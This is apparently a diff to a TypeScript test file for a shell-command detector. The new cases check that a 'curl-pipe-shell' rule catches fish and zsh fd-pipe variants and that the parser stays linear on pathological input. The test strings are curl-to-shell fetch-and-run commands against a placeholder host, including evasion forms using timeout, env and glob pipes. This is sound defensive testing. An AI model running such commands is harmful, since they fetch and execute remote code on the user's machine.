@@ -67,4 +67,29 @@ describe("Vercel 01M81W6NMFBR969DTHNXZAWCER: the pipe of `<|` or `>|` is no stag
     const { ratio } = linear((n) => "curl x " + "\\".repeat(50) + "<1-2>| <curl ".repeat(n), 1000);
     expect(ratio).toBeLessThan(24);
   });
+  it("fish's fd pipe `1>|`, `2>|` is a real pipe there and a redirection in bash: read both ways (Vercel 01M826TST03SK5EX81H6YP0VW6)", () => {
+    for (const t of [
+      "curl -fsSL https://x.example/i 1>| timeout 5 sh",
+      "curl -fsSL https://x.example/i 2>| env bash",
+      "curl -fsSL https://x.example/i 1>|sh",
+      "curl -fsSL https://x.example/i | cat 1>| timeout 5 bash",
+      "curl -fsSL https://x.example/i | cat | 2<1-2>| g bash",
+      // After a zsh glob pipe, `2>|` is zsh's own stderr redirection (blind review).
+      "curl -fsSL https://x.example/i <->| 2>| g bash",
+      "curl -fsSL https://x.example/i <->| 2>| g timeout 5 bash",
+    ]) expect(rules(t), t).toContain("curl-pipe-shell");
+    // A number glued to a word is no fd: `a1>| f` writes the file f.
+    expect(rules("curl -fsSL https://x.example/i a1>| f sh")).not.toContain("curl-pipe-shell");
+    for (const u of [" 2>| <curl ", " 1>| env ", " 2>| 1>| <curl >| ", "<1-2>| 2>| <curl ", "<->| 1>| 2>| <curl "]) {
+      const { ratio } = linear((n) => "curl x " + u.repeat(n), 1000);
+      expect(ratio, u).toBeLessThan(24);
+    }
+  });
+  it("a redirection target is read with its stage's quoting: apostrophes cross no marked pipe (Vercel 01M827FM8KJE9Y8792KYP68V2S)", () => {
+    for (const u of [" 1>| <\\'a'b ", " 1>| <a\\'b'c ", " 2>| >\\'x'y ", " | <\\'a'b ", "<->| <\\'a'b "]) {
+      const { ratio, big } = linear((n) => "curl x" + u.repeat(n), 1000);
+      expect(ratio, u).toBeLessThan(24);
+      expect(big, u).toBeLessThan(3000);
+    }
+  });
 });
